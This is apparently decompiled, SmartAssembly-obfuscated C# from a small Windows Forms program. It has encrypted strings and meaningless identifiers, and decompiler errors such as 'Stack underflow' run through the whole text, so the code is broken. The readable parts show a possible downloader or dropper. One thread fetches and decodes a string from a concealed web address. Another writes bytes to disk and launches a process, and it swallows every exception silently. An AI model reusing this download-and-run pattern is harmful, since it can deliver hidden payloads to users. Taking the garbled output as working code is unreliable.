using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Net;
using System.Net.Cache;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using _0002;
using _0003;
using _0006;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace _0002
{
	[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "16.0.0.0")]
	[CompilerGenerated]
	internal sealed class _0001
	{
		internal static ResourceManager _0001;

		internal static CultureInfo _0001;

		internal _0001()
		{
		}
	}
	internal sealed class _0002 : Form
	{
		private bool m__0001;

		private string m__0001 = _0090(107396750);

		internal IContainer _0001;

		internal Timer _0001;

		internal Label _0001;

		internal PictureBox _0001;

		internal PictureBox _0002;

		[NonSerialized]
		internal static GetString _0090;

		public _0002()
		{
			//IL_0029: Unknown result type (might be due to invalid IL or missing references)
			//IL_0033: Expected O, but got Unknown
			_0006._0001(this);
			((Form)this).add_FormClosing((FormClosingEventHandler)delegate
			{
				//IL_0015: Incompatible stack heights: 0 vs 1
				//IL_0018: Incompatible stack heights: 0 vs 2
				if (!((_0002)/*Error near IL_0007: Stack underflow*/).m__0001)
				{
					_ = _0019._007E_0083;
					/*Error near IL_001f: Stack underflow*/((object)/*Error near IL_001f: Stack underflow*/, true);
				}
			});
		}

		internal void _0001(object P_0, EventArgs P_1)
		{
		}

		internal void _0002(object P_0, EventArgs P_1)
		{
			//IL_002f: Incompatible stack heights: 0 vs 2
			//IL_0036: Incompatible stack heights: 0 vs 1
			//IL_0040: Incompatible stack heights: 0 vs 2
			//IL_0047: Incompatible stack heights: 0 vs 1
			try
			{
				_ = global::_0002._007E_0002;
				new Thread(_0002);
				/*Error near IL_003d: Stack underflow*/((object)/*Error near IL_003d: Stack underflow*/);
				_ = global::_0002._007E_0002;
				new Thread(_0001);
				/*Error near IL_004e: Stack underflow*/((object)/*Error near IL_004e: Stack underflow*/);
			}
			catch (Exception)
			{
			}
		}

		private void _0001()
		{
			//IL_00ca: Incompatible stack heights: 0 vs 1
			//IL_00d4: Incompatible stack heights: 0 vs 2
			//IL_00de: Incompatible stack heights: 0 vs 1
			//IL_00e8: Incompatible stack heights: 0 vs 1
			//IL_00ee: Incompatible stack heights: 0 vs 2
			//IL_00f8: Incompatible stack heights: 0 vs 2
			//IL_0112: Incompatible stack heights: 0 vs 3
			try
			{
				while (true)
				{
					if (3u != 0)
					{
						_ = global::_0004._000E;
						global::_0003._0008();
						_0090(107396749);
						/*Error near IL_00e8: Stack underflow*/((string)/*Error near IL_00e8: Stack underflow*/, (string)/*Error near IL_00e8: Stack underflow*/);
						((_0002)/*Error near IL_0033: Stack underflow*/).m__0001 = (string)/*Error near IL_0033: Stack underflow*/;
						_ = global::_0005._000F;
						_ = ((_0002)/*Error near IL_0042: Stack underflow*/).m__0001;
						_0006._0001();
						/*Error near IL_0102: Stack underflow*/((string)/*Error near IL_0102: Stack underflow*/, (byte[])/*Error near IL_0102: Stack underflow*/);
						global::_0006._0010(500);
						goto IL_005b;
					}
					goto IL_00a1;
					IL_0082:
					global::_0006._0010(500);
					_000E._0013(this.m__0001);
					goto IL_00a1;
					IL_00a1:
					if (uint.MaxValue != 0)
					{
						this.m__0001 = true;
						global::_0006._0010(100);
						if (4u != 0 && 5u != 0)
						{
							break;
						}
						goto IL_005b;
					}
					goto IL_0082;
					IL_005b:
					if (6 == 0)
					{
						continue;
					}
					_ = _0008._007E_0012;
					_ = _0007._0011;
					string text = ((_0002)/*Error near IL_0072: Stack underflow*/).m__0001;
					Process process = /*Error near IL_0077: Stack underflow*/(text);
					/*Error near IL_0081: Stack underflow*/(process, 300000);
					goto IL_0082;
				}
				_000F._0014();
			}
			catch (Exception)
			{
			}
		}

		private void _0002()
		{
			//IL_0027: Expected O, but got Unknown
			//IL_003d: Expected O, but got Unknown
			//IL_0066: Expected O, but got Unknown
			//IL_008f: Expected O, but got Unknown
			//IL_00c9: Expected O, but got Unknown
			//IL_00ec: Incompatible stack heights: 0 vs 4
			//IL_00f6: Incompatible stack heights: 0 vs 2
			//IL_0100: Incompatible stack heights: 0 vs 2
			//IL_010a: Incompatible stack heights: 0 vs 1
			//IL_0114: Incompatible stack heights: 0 vs 2
			//IL_011e: Incompatible stack heights: 0 vs 1
			//IL_0128: Incompatible stack heights: 0 vs 2
			//IL_0132: Incompatible stack heights: 0 vs 1
			try
			{
				if (true)
				{
					_ = _0018._007E_0081;
					new WebClient();
					new RequestCachePolicy(RequestCacheLevel.BypassCache);
					((WebClient)/*Error near IL_001c: Stack underflow*/).CachePolicy = (RequestCachePolicy?)/*Error near IL_001c: Stack underflow*/;
					((WebClient)/*Error near IL_001c: Stack underflow*/).Proxy = new WebProxy();
					/*Error near IL_0027: Stack underflow*/;
					_0012._0018();
					((WebClient)/*Error near IL_0037: Stack underflow*/).Encoding = (Encoding)/*Error near IL_0037: Stack underflow*/;
					_ = ((WebClient)/*Error near IL_0037: Stack underflow*/).Headers;
					_0090(107396728);
					_0090(107396743);
					((NameValueCollection)/*Error near IL_0060: Stack underflow*/)[(string?)/*Error near IL_0060: Stack underflow*/] = (string?)/*Error near IL_0060: Stack underflow*/;
					_ = ((WebClient)/*Error near IL_0060: Stack underflow*/).Headers;
					_0090(107397073);
					_0090(107397096);
					((NameValueCollection)/*Error near IL_0089: Stack underflow*/)[(string?)/*Error near IL_0089: Stack underflow*/] = (string?)/*Error near IL_0089: Stack underflow*/;
					_ = ((WebClient)/*Error near IL_0089: Stack underflow*/).Headers;
					_0090(107396979);
					_0090(107396990);
					((NameValueCollection)/*Error near IL_013c: Stack underflow*/)[(string?)/*Error near IL_013c: Stack underflow*/] = (string?)/*Error near IL_013c: Stack underflow*/;
					string address = _0090(107396969);
					string text = ((WebClient)/*Error near IL_00c2: Stack underflow*/).DownloadString(address);
					string text2 = _0017._007E_001E(_0017._007E_001D(text));
					/*Error near IL_00e4: Stack underflow*/((object)/*Error near IL_00e4: Stack underflow*/, text2);
				}
			}
			catch (Exception)
			{
			}
		}

		protected override void _0001(bool P_0)
		{
			//IL_0034: Incompatible stack heights: 0 vs 1
			//IL_0037: Incompatible stack heights: 0 vs 1
			//IL_003a: Incompatible stack heights: 0 vs 2
			//IL_0044: Incompatible stack heights: 0 vs 2
			//IL_0047: Incompatible stack heights: 0 vs 1
			while (4u != 0)
			{
				if ((int)/*Error near IL_0007: Stack underflow*/ != 0)
				{
					while (3 == 0 || ((_0002)/*Error near IL_0011: Stack underflow*/)._0001 != null)
					{
						if (7u != 0)
						{
							_ = global::_0002._007E_0003;
							IContainer container = ((_0002)/*Error near IL_0022: Stack underflow*/)._0001;
							/*Error near IL_0041: Stack underflow*/(container);
							break;
						}
					}
				}
				if (6u != 0)
				{
					_ = _0019._0082;
					/*Error near IL_004e: Stack underflow*/((object)/*Error near IL_004e: Stack underflow*/, (byte)/*Error near IL_004e: Stack underflow*/ != 0);
					break;
				}
			}
		}

		[CompilerGenerated]
		private void _0001(object P_0, FormClosingEventArgs P_1)
		{
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 2
			if (!((_0002)/*Error near IL_0007: Stack underflow*/).m__0001)
			{
				_ = _0019._007E_0083;
				/*Error near IL_001f: Stack underflow*/((object)/*Error near IL_001f: Stack underflow*/, true);
			}
		}

		static _0002()
		{
			//IL_00f3: Incompatible stack heights: 0 vs 1
			//IL_010d: Incompatible stack heights: 0 vs 1
			//IL_0119: Incompatible stack heights: 0 vs 4
			//IL_0123: Incompatible stack heights: 0 vs 1
			//IL_012d: Incompatible stack heights: 0 vs 1
			//IL_0137: Incompatible stack heights: 0 vs 1
			_ = typeof(_0002);
			Strings.CreateGetStringDelegate((Type)/*Error near IL_00fd: Stack underflow*/);
			int num = 0;
			Assembly assembly = default(Assembly);
			if (num == 0)
			{
				bool flag = (byte)num != 0;
				if (true)
				{
					_001A._008E();
					assembly = (Assembly)/*Error near IL_0113: Stack underflow*/;
					_ = _001B._007E_008F;
					_ = _001B._007E_008F;
					_ = _0017._007E_001F;
					/*Error near IL_0123: Stack underflow*/((object)/*Error near IL_0123: Stack underflow*/);
					_0090(107396924);
					_0090(107396887);
					string text = /*Error near IL_006c: Stack underflow*/((object)/*Error near IL_006c: Stack underflow*/, (string)/*Error near IL_006c: Stack underflow*/, (string)/*Error near IL_006c: Stack underflow*/);
					string text2 = _0090(107396882);
					string text3 = _0090(107396877);
					Uri uri = new Uri(/*Error near IL_008f: Stack underflow*/(text, text2, text3));
					num = (_0006._0001(_0017._007E_007F(uri), true, out flag) ? 1 : 0);
					if (false)
					{
						goto IL_00ae;
					}
					if (num == 0)
					{
						goto IL_00d8;
					}
				}
				num = (flag ? 1 : 0);
			}
			goto IL_00ae;
			IL_00d8:
			throw new SecurityException(_0090(107396335));
			IL_00ae:
			if (num != 0 && _001C._007E_0090(_0017._007E_0080(assembly), _0090(107396904)))
			{
				return;
			}
			goto IL_00d8;
		}
	}
}
namespace _0001
{
	internal static class _0002
	{
		[STAThread]
		private static void _0001()
		{
			//IL_002f: Incompatible stack heights: 0 vs 2
			_000F._0015();
			_001D._0091(false);
			_ = _001E._0092;
			new global::_0002._0002();
			if (2u != 0)
			{
				/*Error near IL_0036: Stack underflow*/((Form)/*Error near IL_0036: Stack underflow*/);
			}
		}
	}
}
namespace _0006
{
	[AttributeUsage(AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Constructor | AttributeTargets.Method)]
	internal sealed class _0001 : Attribute
	{
	}
}
namespace _0002
{
	internal sealed class _0003
	{
	}
}
namespace _0003
{
	internal sealed class _0002
	{
		internal struct _0001
		{
			public string _0001;

			public Version _0001;

			public string _0002;

			public string _0003;

			public string _0001(bool _0002)
			{
				//IL_00c4: Incompatible stack heights: 0 vs 1
				//IL_00d0: Incompatible stack heights: 0 vs 1
				//IL_00d6: Incompatible stack heights: 0 vs 1
				//IL_00e0: Incompatible stack heights: 0 vs 1
				//IL_00e6: Incompatible stack heights: 0 vs 1
				//IL_00ec: Incompatible stack heights: 0 vs 1
				//IL_00f6: Incompatible stack heights: 0 vs 1
				//IL_00fc: Incompatible stack heights: 0 vs 1
				new StringBuilder();
				StringBuilder stringBuilder = (StringBuilder)/*Error near IL_00ca: Stack underflow*/;
				string value = ((_0001)/*Error near IL_0019: Stack underflow*/)._0001;
				((StringBuilder)/*Error near IL_00e0: Stack underflow*/).Append(value);
				if (0 == 0)
				{
					while ((int)/*Error near IL_0029: Stack underflow*/ != 0)
					{
						_ = ((_0001)/*Error near IL_0033: Stack underflow*/)._0001 != null;
						if (4u != 0)
						{
							if ((int)/*Error near IL_003e: Stack underflow*/ != 0)
							{
								((StringBuilder)/*Error near IL_004d: Stack underflow*/).Append(", Version=");
								stringBuilder.Append(this._0001);
							}
							break;
						}
					}
					stringBuilder.Append(", Culture=");
				}
				if (8u != 0)
				{
					stringBuilder.Append((this._0002.Length == 0) ? "neutral" : this._0002);
					stringBuilder.Append(", PublicKeyToken=");
					stringBuilder.Append((_0003.Length == 0) ? "null" : _0003);
				}
				return stringBuilder.ToString();
			}

			public _0001(string _0002)
			{
				this._0001 = null;
				this._0002 = string.Empty;
				_0003 = string.Empty;
				this._0001 = string.Empty;
				string[] array = _0002.Split(new char[1] { ',' });
				for (int i = 0; i < array.Length; i++)
				{
					string text = array[i].Trim();
					if (text.StartsWith("Version="))
					{
						this._0001 = new Version(text.Substring(8));
					}
					else if (text.StartsWith("Culture="))
					{
						this._0002 = text.Substring(8);
						if (this._0002 == "neutral")
						{
							this._0002 = string.Empty;
						}
					}
					else if (text.StartsWith("PublicKeyToken="))
					{
						_0003 = text.Substring(15);
						if (_0003 == "null")
						{
							_0003 = string.Empty;
						}
					}
					else
					{
						this._0001 = text;
					}
				}
			}
		}

		internal const string _0001 = "{71461f04-2faa-4bb9-a0dd-28a79101b599}";

		private const int m__0001 = 4;

		internal static Dictionary<string, Assembly> _0001;

		internal static bool IsWebApplication
		{
			get
			{
				//IL_002a: Incompatible stack heights: 0 vs 1
				//IL_003c: Incompatible stack heights: 0 vs 1
				//IL_0043: Incompatible stack heights: 0 vs 1
				//IL_004a: Incompatible stack heights: 0 vs 1
				//IL_0051: Incompatible stack heights: 0 vs 1
				//IL_0057: Incompatible stack heights: 0 vs 1
				//IL_005e: Incompatible stack heights: 0 vs 1
				//IL_0064: Incompatible stack heights: 0 vs 1
				bool flag;
				try
				{
					Process.GetCurrentProcess();
					_ = ((Process)/*Error near IL_0043: Stack underflow*/).MainModule;
					_ = ((ProcessModule)/*Error near IL_004a: Stack underflow*/).ModuleName;
					((string)/*Error near IL_0051: Stack underflow*/).ToLower();
					string text = (string)/*Error near IL_0054: Stack underflow*/;
					if (0 == 0)
					{
						_ = (string?)/*Error near IL_005e: Stack underflow*/ == "w3wp.exe";
						if (uint.MaxValue != 0)
						{
							if ((int)/*Error near IL_001b: Stack underflow*/ != 0)
							{
								if (0 == 0)
								{
									flag = true;
								}
								goto IL_006b;
							}
							_ = (string?)/*Error near IL_002f: Stack underflow*/ == "aspnet_wp.exe";
						}
						if ((int)/*Error near IL_0031: Stack underflow*/ != 0)
						{
							flag = true;
							goto IL_006b;
						}
					}
				}
				catch
				{
				}
				goto IL_0069;
				IL_006b:
				if (4 == 0)
				{
					goto IL_0069;
				}
				int result = (flag ? 1 : 0);
				if (0 == 0)
				{
					return (byte)result != 0;
				}
				goto IL_006a;
				IL_0069:
				result = 0;
				goto IL_006a;
				IL_006a:
				return (byte)result != 0;
			}
		}

		static _0002()
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			new Dictionary<string, Assembly>();
			_0002._0001 = (Dictionary<string, Assembly>)/*Error near IL_0007: Stack underflow*/;
		}
	}
}
namespace _0001
{
	internal sealed class _0003
	{
	}
	[AttributeUsage(AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Constructor | AttributeTargets.Method)]
	internal sealed class _0001 : Attribute
	{
	}
}
namespace _0004
{
	[AttributeUsage(AttributeTargets.Assembly | AttributeTargets.Module | AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Enum | AttributeTargets.Constructor | AttributeTargets.Method | AttributeTargets.Property | AttributeTargets.Field | AttributeTargets.Event | AttributeTargets.Interface | AttributeTargets.Parameter | AttributeTargets.Delegate)]
	internal sealed class _0001 : Attribute
	{
	}
}
namespace _0005
{
	[AttributeUsage(AttributeTargets.Assembly | AttributeTargets.Module | AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Enum | AttributeTargets.Constructor | AttributeTargets.Method | AttributeTargets.Property | AttributeTargets.Field | AttributeTargets.Event | AttributeTargets.Interface | AttributeTargets.Parameter | AttributeTargets.Delegate)]
	internal sealed class _0001 : Attribute
	{
	}
}
namespace _0001
{
	[AttributeUsage(AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Enum | AttributeTargets.Interface)]
	internal sealed class _0004 : Attribute
	{
	}
	[AttributeUsage(AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Enum | AttributeTargets.Interface)]
	internal sealed class _0005 : Attribute
	{
	}
}
namespace _0003
{
	[AttributeUsage(AttributeTargets.Class | AttributeTargets.Method)]
	internal sealed class _0003 : Attribute
	{
	}
	internal sealed class _0001
	{
		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 116)]
		private struct _0001
		{
		}

		internal static readonly _0001 _0001/* Not supported: data(01 00 02 00 03 00 04 00 05 00 06 00 07 00 08 00 0E 00 0F 00 10 00 11 00 12 00 13 00 14 00 15 00 16 00 17 00 18 00 19 00 1A 00 1B 00 1C 00 1D 00 1E 00 1F 00 7F 00 80 00 81 00 82 00 83 00 84 00 86 00 87 00 88 00 89 00 8A 00 8B 00 8C 00 8D 00 8E 00 8F 00 90 00 91 00 92 00 93 00 94 00 95 00 96 00 97 00 98 00 99 00 9A 00 9B 00 9C 00 9D 00 9E 00 9F 00) */;
	}
}
namespace _0005
{
	internal sealed class _0002
	{
	}
}
namespace _0002
{
	internal sealed class _0004
	{
		private static Assembly m__0001 = null;

		private static string[] m__0001 = new string[0];

		internal static void _0001()
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			try
			{
				_ = AppDomain.CurrentDomain;
				ResolveEventHandler value = _0001;
				((AppDomain)/*Error near IL_001e: Stack underflow*/).ResourceResolve += value;
			}
			catch (Exception)
			{
			}
		}

		private static Assembly _0001(object P_0, ResolveEventArgs P_1)
		{
			//IL_0041: Incompatible stack heights: 0 vs 1
			//IL_0048: Incompatible stack heights: 0 vs 1
			//IL_00af: Incompatible stack heights: 0 vs 1
			//IL_00bf: Incompatible stack heights: 0 vs 1
			//IL_00c9: Incompatible stack heights: 0 vs 1
			do
			{
				if ((object)_0004.m__0001 == null)
				{
					string[] obj = _0004.m__0001;
					Monitor.Enter((object)/*Error near IL_00b9: Stack underflow*/);
					try
					{
						Assembly.Load("{197ada35-cec2-4db7-954e-9c6adca10a74}, PublicKeyToken=3e56350693f7355e");
						_0004.m__0001 = (Assembly)/*Error near IL_0027: Stack underflow*/;
						if ((object)_0004.m__0001 != null)
						{
							_0004.m__0001.GetManifestResourceNames();
							_0004.m__0001 = (string[])/*Error near IL_003a: Stack underflow*/;
						}
					}
					finally
					{
						Monitor.Exit(obj);
					}
				}
				_ = ((ResolveEventArgs)/*Error near IL_00c9: Stack underflow*/).Name;
				string text = (string)/*Error near IL_00cf: Stack underflow*/;
				int num = 0;
				while (true)
				{
					int num2 = num;
					nint num3;
					if (true)
					{
						num3 = (nint)_0004.m__0001.LongLength;
						while (8u != 0 || 1 == 0)
						{
							num3 = (int)num3;
							if (false)
							{
								continue;
							}
							goto IL_009e;
						}
						goto IL_0088;
					}
					goto IL_0072;
					IL_0088:
					num = num2 + 1;
					continue;
					IL_0072:
					if (0 == 0)
					{
						if (num2 != 0)
						{
							if (!_0004._0001())
							{
								return null;
							}
							return _0004.m__0001;
						}
						num2 = num;
					}
					num3 = 1;
					goto IL_0088;
					IL_009e:
					if (num2 >= num3)
					{
						break;
					}
					num2 = ((_0004.m__0001[num] == text) ? 1 : 0);
					goto IL_0072;
				}
			}
			while (5 == 0);
			return null;
		}

		private unsafe static bool _0001()
		{
			//IL_0056: Incompatible stack heights: 0 vs 1
			//IL_005d: Incompatible stack heights: 0 vs 1
			//IL_0063: Incompatible stack heights: 0 vs 1
			//IL_0066: Incompatible stack heights: 0 vs 1
			//IL_0069: Incompatible stack heights: 0 vs 1
			//IL_0070: Incompatible stack heights: 0 vs 1
			//IL_0077: Incompatible stack heights: 0 vs 1
			int num;
			while (true)
			{
				if (true)
				{
					num = 5;
					goto IL_0004;
				}
				goto IL_0081;
				IL_0004:
				byte* num2 = stackalloc byte[num];
				void* ptr;
				if (7u != 0)
				{
					ptr = num2;
				}
				try
				{
					new StackTrace();
					((StackTrace)/*Error near IL_005d: Stack underflow*/).GetFrames();
					StackFrame[] array = (StackFrame[])/*Error near IL_0060: Stack underflow*/;
					do
					{
						*(int*)(nint)/*Error near IL_0018: Stack underflow*/ = 2;
					}
					while (1 == 0);
					if (0 == 0)
					{
						while (true)
						{
							if (*(int*)ptr < array.Length)
							{
								int num3 = *(int*)(nint)/*Error near IL_0025: Stack underflow*/;
								((StackFrame)((object[])/*Error near IL_0026: Stack underflow*/)[num3]).GetMethod();
								_ = ((MemberInfo)/*Error near IL_0077: Stack underflow*/).Module;
								if ((object)((Module)/*Error near IL_002f: Stack underflow*/).Assembly == Assembly.GetExecutingAssembly())
								{
									((byte*)ptr)[4] = 1;
									break;
								}
								(*(int*)ptr)++;
								continue;
							}
							((byte*)ptr)[4] = 0;
							break;
						}
					}
				}
				catch
				{
					((byte*)ptr)[4] = 1;
				}
				goto IL_0081;
				IL_0081:
				if (false)
				{
					continue;
				}
				num = ((byte*)ptr)[4];
				if (8u != 0 && 4u != 0)
				{
					break;
				}
				goto IL_0004;
			}
			return (byte)num != 0;
		}
	}
}
namespace _0006
{
	internal sealed class _0002
	{
		private static readonly string m__0001;

		private static readonly string m__0002;

		internal static readonly byte[] _0001;

		internal static readonly Dictionary<int, string> _0001;

		internal static readonly object _0001;

		internal static readonly bool _0001;

		private static readonly int m__0001;

		public static string _0001(int P_0)
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_001a: Unknown result type (might be due to invalid IL or missing references)
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 1
			//IL_0036: Expected I4, but got Unknown
			//IL_0039: Incompatible stack heights: 0 vs 1
			//IL_003d: Expected I4, but got Unknown
			//IL_0040: Incompatible stack heights: 0 vs 1
			//IL_0047: Incompatible stack heights: 0 vs 1
			//IL_004a: Incompatible stack heights: 0 vs 1
			//IL_0051: Incompatible stack heights: 0 vs 1
			if (8u != 0)
			{
				int num = 107396847;
				do
				{
					if (num != 0)
					{
						P_0 = /*Error near IL_000e: Stack underflow*/^ num;
						num = _0006._0002.m__0001;
					}
				}
				while (false);
				P_0 = /*Error near IL_001b: Stack underflow*/- num;
				_ = _0006._0002._0001;
			}
			if ((int)/*Error near IL_0024: Stack underflow*/ == 0 && 0 == 0)
			{
				global::_0002._0006._0001((int)/*Error near IL_0047: Stack underflow*/);
				return (string)/*Error near IL_002c: Stack underflow*/;
			}
			global::_0002._0006._0001((int)/*Error near IL_0051: Stack underflow*/);
			return (string)/*Error near IL_0031: Stack underflow*/;
		}

		static _0002()
		{
			//IL_0072: Incompatible stack heights: 1 vs 0
			//IL_00d7: Incompatible stack heights: 0 vs 3
			//IL_00de: Incompatible stack heights: 0 vs 1
			//IL_00f5: Incompatible stack heights: 0 vs 1
			//IL_0109: Incompatible stack heights: 0 vs 1
			//IL_0113: Incompatible stack heights: 0 vs 1
			//IL_011d: Incompatible stack heights: 0 vs 2
			//IL_0127: Incompatible stack heights: 0 vs 1
			_0006._0002.m__0001 = "1";
			m__0002 = "108";
			if (3u != 0)
			{
				_0006._0002._0001 = null;
				new object();
				_0006._0002._0001 = (object)/*Error near IL_0027: Stack underflow*/;
				_0006._0002._0001 = false;
			}
			while (true)
			{
				_0006._0002.m__0001 = 0;
				bool num = _001F._0093(_0006._0002.m__0001, "1");
				int num3;
				do
				{
					if (num)
					{
						if (4 == 0)
						{
							return;
						}
						_0006._0002._0001 = true;
						new Dictionary<int, string>();
						_0006._0002._0001 = (Dictionary<int, string>)/*Error near IL_0062: Stack underflow*/;
					}
					_007F._0094(m__0002);
					if (false)
					{
						continue;
					}
					_0006._0002.m__0001 = (num ? 1 : 0);
					_ = _0080._007E_0095;
					_001A._008E();
					/*Error near IL_0127: Stack underflow*/((object)/*Error near IL_0127: Stack underflow*/, "{ce2148f5-f21c-4020-90b4-0901eafbdeda}");
					Stream stream = (Stream)/*Error near IL_012d: Stack underflow*/;
					try
					{
						_ = _0082._0097;
						_ = _0081._007E_0096;
						/*Error near IL_00de: Stack underflow*/((object)/*Error near IL_00de: Stack underflow*/);
						int num2 = /*Error near IL_00aa: Stack underflow*/((long)/*Error near IL_00aa: Stack underflow*/);
						byte[] array = new byte[num2];
						while (true)
						{
							_0083._007E_0098(stream, array, 0, num2);
							while (0 == 0)
							{
								_0006._0002._0001 = global::_0002._0006._0001(array);
								array = null;
								if (4u != 0)
								{
									return;
								}
							}
						}
					}
					finally
					{
						if (stream != null)
						{
							global::_0002._007E_0003(stream);
						}
					}
				}
				while (num3 != 0);
			}
		}
	}
}
namespace _0002
{
	[AttributeUsage(AttributeTargets.Assembly | AttributeTargets.Module | AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Enum | AttributeTargets.Constructor | AttributeTargets.Method | AttributeTargets.Property | AttributeTargets.Field | AttributeTargets.Event | AttributeTargets.Interface | AttributeTargets.Parameter | AttributeTargets.Delegate)]
	internal sealed class _0005 : Attribute
	{
	}
}
namespace _0001
{
	[AttributeUsage(AttributeTargets.Method)]
	internal sealed class _0006 : Attribute
	{
	}
}
namespace _0003
{
	internal static class _0004
	{
		internal sealed class _0001
		{
			internal static readonly int[] _0001;

			internal static readonly int[] _0002;

			internal static readonly int[] _0003;

			internal static readonly int[] _0004;

			internal int _0001;

			internal int _0002;

			internal int _0003;

			internal int _0004;

			internal int _0005;

			internal bool _0001;

			internal _0002 _0001;

			internal _0003 _0001;

			internal _0005 _0001;

			internal _0004 _0001;

			internal _0004 _0002;

			public _0001(byte[] P_0)
			{
				this._0001 = new _0002();
				this._0001 = new _0003();
				this._0001 = 2;
				global::_0002._0006._0001(0, P_0, this._0001, P_0.Length);
			}

			static _0001()
			{
				//IL_0065: Incompatible stack heights: 0 vs 1
				//IL_006c: Incompatible stack heights: 0 vs 1
				//IL_0073: Incompatible stack heights: 0 vs 1
				//IL_007a: Incompatible stack heights: 0 vs 1
				while (true)
				{
					int num = 29;
					while (true)
					{
						RuntimeHelpers.InitializeArray(new int[num], (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
						global::_0003._0004._0001._0001 = (int[])/*Error near IL_0014: Stack underflow*/;
						while (0 == 0)
						{
							_ = new int[29]
							{
								0, 0, 0, 0, 0, 0, 0, 0, 1, 1,
								1, 1, 2, 2, 2, 2, 3, 3, 3, 3,
								4, 4, 4, 4, 5, 5, 5, 5, 0
							};
							global::_0003._0004._0001._0002 = (int[])/*Error near IL_002b: Stack underflow*/;
							if (1 == 0)
							{
								continue;
							}
							goto IL_002e;
						}
						goto IL_0059;
						IL_0042:
						num = 30;
						if (num == 0)
						{
							continue;
						}
						RuntimeHelpers.InitializeArray(new int[num], (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
						global::_0003._0004._0001._0004 = (int[])/*Error near IL_0059: Stack underflow*/;
						goto IL_0059;
						IL_002e:
						_ = new int[30]
						{
							1, 2, 3, 4, 5, 7, 9, 13, 17, 25,
							33, 49, 65, 97, 129, 193, 257, 385, 513, 769,
							1025, 1537, 2049, 3073, 4097, 6145, 8193, 12289, 16385, 24577
						};
						global::_0003._0004._0001._0003 = (int[])/*Error near IL_0042: Stack underflow*/;
						goto IL_0042;
						IL_0059:
						if (false)
						{
							break;
						}
						if (0 == 0)
						{
							return;
						}
						goto IL_0042;
					}
				}
			}
		}

		internal sealed class _0002
		{
			internal byte[] _0001;

			internal int _0001;

			internal int _0002;

			internal uint _0001;

			internal int _0003;
		}

		internal sealed class _0003
		{
			internal byte[] _0001 = new byte[32768];

			internal int _0001;

			internal int _0002;
		}

		internal sealed class _0004
		{
			internal short[] _0001;

			public static readonly _0004 _0001;

			public static readonly _0004 _0002;

			static _0004()
			{
				//IL_003c: Invalid comparison between Unknown and I4
				//IL_0061: Invalid comparison between Unknown and I4
				//IL_00ce: Incompatible stack heights: 0 vs 1
				//IL_00d4: Incompatible stack heights: 0 vs 1
				//IL_00da: Incompatible stack heights: 0 vs 1
				//IL_00e0: Incompatible stack heights: 0 vs 1
				//IL_00e6: Incompatible stack heights: 0 vs 1
				//IL_00ec: Incompatible stack heights: 0 vs 1
				//IL_00f2: Incompatible stack heights: 0 vs 1
				byte[] array = new byte[288];
				int num = default(int);
				while (true)
				{
					IL_000f:
					if (0 == 0)
					{
						if (0 == 0)
						{
							num = 0;
						}
						if (-1 == 0)
						{
							goto IL_0086;
						}
						while ((int)/*Error near IL_003e: Stack underflow*/ < 144)
						{
							num++;
							((sbyte[])/*Error near IL_0032: Stack underflow*/)[/*Error near IL_0032: Stack underflow*/] = 8;
						}
						if (true)
						{
							while ((int)/*Error near IL_0063: Stack underflow*/ < 256)
							{
								if (false)
								{
									goto IL_000f;
								}
								num++;
								((sbyte[])/*Error near IL_0057: Stack underflow*/)[/*Error near IL_0057: Stack underflow*/] = 9;
							}
							goto IL_0071;
						}
					}
					goto IL_00a1;
					IL_0071:
					int num2;
					int num3;
					while (true)
					{
						num2 = num;
						num3 = 280;
						if (num3 == 0)
						{
							break;
						}
						if (num2 < num3)
						{
							int num4 = num++;
							((sbyte[])/*Error near IL_0071: Stack underflow*/)[num4] = 7;
							continue;
						}
						goto IL_0086;
					}
					goto IL_00b0;
					IL_00ad:
					num2 = num;
					num3 = 32;
					goto IL_00b0;
					IL_00a1:
					num = 0;
					goto IL_00ad;
					IL_00b0:
					if (num2 >= num3)
					{
						if (8u != 0)
						{
							break;
						}
						goto IL_0071;
					}
					array[num++] = 5;
					goto IL_00ad;
					IL_0086:
					while (num < 288)
					{
						array[num++] = 8;
					}
					_0001 = new _0004(array);
					array = new byte[32];
					goto IL_00a1;
				}
				_0002 = new _0004(array);
			}

			public _0004(byte[] P_0)
			{
				global::_0002._0006._0001(this, P_0);
			}
		}

		internal sealed class _0005
		{
			internal static readonly int[] _0001;

			internal static readonly int[] _0002;

			internal byte[] _0001;

			internal byte[] _0002;

			internal _0004 _0001;

			internal int _0001;

			internal int _0002;

			internal int _0003;

			internal int _0004;

			internal int _0005;

			internal int _0006;

			internal byte _0001;

			internal int _0007;

			internal static readonly int[] _0003;

			static _0005()
			{
				//IL_004c: Incompatible stack heights: 0 vs 1
				//IL_0053: Incompatible stack heights: 0 vs 1
				//IL_005a: Incompatible stack heights: 0 vs 1
				while (true)
				{
					int num = 3;
					while (true)
					{
						IL_0001:
						RuntimeHelpers.InitializeArray(new int[num], (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
						global::_0003._0004._0005._0001 = (int[])/*Error near IL_0013: Stack underflow*/;
						while (0 == 0)
						{
							num = 3;
							if (num != 0)
							{
								RuntimeHelpers.InitializeArray(new int[num], (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
